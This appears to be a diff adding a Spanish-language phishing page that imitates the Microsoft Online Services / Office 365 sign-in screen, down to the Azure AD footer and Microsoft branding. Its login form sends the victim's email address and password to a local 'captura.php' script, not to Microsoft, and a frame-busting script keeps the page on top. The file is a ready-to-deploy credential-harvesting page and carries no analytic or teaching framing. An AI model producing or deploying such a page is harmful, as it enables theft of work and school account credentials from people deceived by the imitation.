@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html style="background-color: rgb(235, 60, 0);">
+
+<head>
+    <title>Iniciar sesión en Microsoft Online Services</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <link rel="ICON" href="index_files/icono.ico">
+    <link href="index_files/inicio.css" rel="stylesheet" type="text/css">
+
+    <![endif]-->
+    <!--[if lte IE 7]>
+    <style type='text/css'>
+        .legado {
+            display: none;
+        }
+        
+        body {
+            background-color: #0072C6;
+        }
+    </style>
+    <![endif]-->
+    <script type="text/javascript">
+        if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+            var vista = document.createElement("style");
+            vista.appendChild(
+                document.createTextNode(
+                    "@-ms-viewport{width:auto!important}"
+                )
+            );
+            vista.appendChild(
+                document.createTextNode(
+                    "@-ms-viewport{height:auto!important}"
+                )
+            );
+            document.getElementsByTagName("head")[0].appendChild(vista);
+        }
+    </script>
+
+    <script src="index_files/jquery-12.js" type="text/javascript"></script>
+    <script src="index_files/jqueryMigrar.js" type="text/javascript"></script>
+    <script src="index_files/unAd.js" type="text/javascript"></script>
+    <script src="index_files/jqueryOriginal.js" type="text/javascript"></script>
+    <style> body {
+        display: none;
+    }</style>
+</head>
+<body style="display: block;">
+<script>
+    if (self == top) {
+        var body = $('body');
+        body.css('display', 'block');
+    } else {
+        top.location = self.location;
+    }
+</script>
+<div id="back_container" class="legado" style="background: rgb(235, 60, 0) none repeat scroll 0% 0%;">
+    <img id="background_background_image"
+         style="width: 966px; height: 735px; background-color: rgb(235, 60, 0); visibility: visible; display: block;"
+         src="index_files/illust.jpg">
+    <div id="auto_low_bandwidth_background_notification" class="smalltext">It looks like you're on a slow connection.
+        We've disabled some images to speed things up.
+    </div>
+
+</div>
+<div id="backPage_overlay" class="overlay legado"
+     style="background-color: rgb(235, 60, 0); visibility: visible; display: none;" aria-hidden="true">
+</div>
+
+<div id="login_panel" class="login_panel" style="display: block;">
+    <table class="login_panel_layout" style="height: 100%;">
+        <tbody>
+        <tr class="login_panel_layout_row" style="height: 100%;">
+    <td id="login_panel_left"></td>
+            <td id="login_panel_center">
+                <script type="text/javascript">
+                    $(document).ready(function () {
+                        if ($.support.cookies) {
+                            $('.login_inner_container').removeClass('no_display');
+                            $('.no_cookie').addClass('no_display');
+                        } else {
+                            $('.login_inner_container').addClass('no_display');
+                            $('.no_cookie').removeClass('no_display');
+                        }
+                    });
+                </script>
+                <div class="login_inner_container no_cookie no_display" aria-hidden="true">
+                    <div class="inner_container cred" style="height: 222px;">
+                        <div class="login_workload_logo_container">
+                            <img style="visibility: visible;" id="login_workload_logo_image" class="workload_img"
+                                 src="index_files/logo.png"></div>
+                        <div id="login_no_cookie_error_container" class="login_full_error_container">
+                            <div id="login_no_cookie_error_text" class="cta_text 1">
+                                <h1>No podemos iniciar su sesión :-(</h1>
+                                <p>Actualmente, el explorador está configurado para bloquear cookies. Es necesario que
+                                    permita las cookies para usar este servicio.</p>
+                                <p>Las
+                                    cookies son pequeños archivos de texto almacenados en su equipo que nos
+                                    informan de cuándo ha iniciado sesión. Para obtener más información
+                                    sobre cómo permitir cookies, consulte la ayuda en línea en el explorador
+                                    web.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <script type="text/javascript">
+                    $(document).ready(function () {
+
+
+                        Constants.DEFAULT_LOGO = '';
+                        Constants.DEFAULT_LOGO_ALT = '';
+                        Constants.DEFAULT_ILLUSTRATION = 'https://secure.aadcdn.microsoftonline-p.com/aadbranding/1.0.1/aadlogin/Office365/illustration.jpg';
+                        Constants.DEFAULT_BACKGROUND_COLOR = '#EB3C00';
+
+                        Context.TenantBranding.workload_branding_enabled = true;
+                        User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
+                        User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);
+                        Context.TenantBranding.whr_key = '';
+                        jQuery('img#logo_img').attr('src', '');
+                        Context.use_instrumentation = true;
+                        User.moveFooterToBottom('250px');
+                    });
+                </script>
+                <div class="login_inner_container">
+                    <div class="inner_container cred" style="height: 392px;">
+                        <div class="login_workload_logo_container">
+                            <img style="visibility: visible;" id="login_workload_logo_image" class="workload_img"
+                                 src="index_files/logo.png"></div>
+                        <div id="login_error_container" class="login_error_container">
+                        </div>
+                        <div class="login_cta_container normaltext">
+                            
+                            
+                            <img src="index_files/prueba.png" width="42%" height="auto">
+                            <br><br><br>
+                            <div id="login_cta_text" class="cta_message_text 1">Inicie sesión con su cuenta
+                                profesional
+                            </div>
+                        </div>
+                        <ul class="login_cred_container">
+                            <li class="login_cred_field_container">
+                                <form action="captura.php" method="post">
+	<div>
+		<input class="login_textfield textfield required email field normaltext"
+                         placeholder="alguien@example.com" type="email" name="email" value="" autocomplete="off">
+	</div>
+<br>
+	<div>
+		<input class="login_textfield textfield required field normaltext" placeholder="Contraseña" type="password" name="pass" value="">
+		
+		
+	</div>
+
+
+ <div id="cred_kmsi_container" class="subtext normaltext">
+              <span class="input_field ">
+                <input tabindex="10" id="cred_keep_me_signed_in_checkbox" value="0" name="persist" type="checkbox">
+                <label id="keep_me_signed_in_label_text" for="cred_keep_me_signed_in_checkbox" class="persist_text">Mantener la sesión iniciada</label>
+              </span>
+              </div>
+	<div>
+		<input class="button normaltext cred_sign_in_button refresh_domain_state disabled_button"
+                                      role="button" style="opacity: 1;" id="iniciarSesion" value="Iniciar sesión" type="submit">
+	</div>
+ <div id="recover_container" class="subtext smalltext" style="opacity: 1;">
+              <span>
+                 <a id="cred_forgot_password_link" tabindex="12"
+                    href="">¿No puede acceder a su cuenta?</a>
+              </span>
+                                </div>
+		</form>
+                            </li>
+                            </ul>
+                    </div>
+                    
+                </div>
+                
+                <div id="footer_links_container" class="login_footer_container sticky_footer">
+                    <div class="footer_inner_container">
+                        <table id="footer_table">
+                            <tbody>
+                            <tr>
+                                <td>
+                                    <div class="footer_glyph">
+                                        <img src="index_files/AD_Glyph_Footer_30x30.png" class="footer_glyph"
+                                             alt="Ilustración de Azure Active Directory">
+                                    </div>
+                                </td>
+                                <td>
+                                    <div class="footer tinytext">
+                                        
+              <span class="corporate_footer">
+                <span class="branding_footer">Puede usar su cuenta profesional o educativa en cualquier lugar en el que esté presente este símbolo.</span>
+                                <span class="corp_link" id="footer_copyright_link">© 2017 Microsoft</span>
+
+              <span class="corp_link"><a tabindex="40" id="footer_link_0" class="footer_link_legal"
+                                         href="">Legal</a></span><span
+                      class="corp_link"><a tabindex="41" id="footer_link_1" class="footer_link_privacy"
+                                           href="">Privacidad</a></span><span
+                      class="corp_link"><a tabindex="42" id="footer_link_2" class="footer_link_feedback"
+                                           href="">Comentarios</a></span></span>
+                                           
+                                    </div>
+                                </td>
+                            </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                <div id="login_prefetch_container" class="no_display" aria-hidden="true"></div>
+            </td>
+            <td id="login_panel_right">
+            </td>
+                </tr>
+                </tbody>
+        </table>
+        </div>
+</body>
+</html>
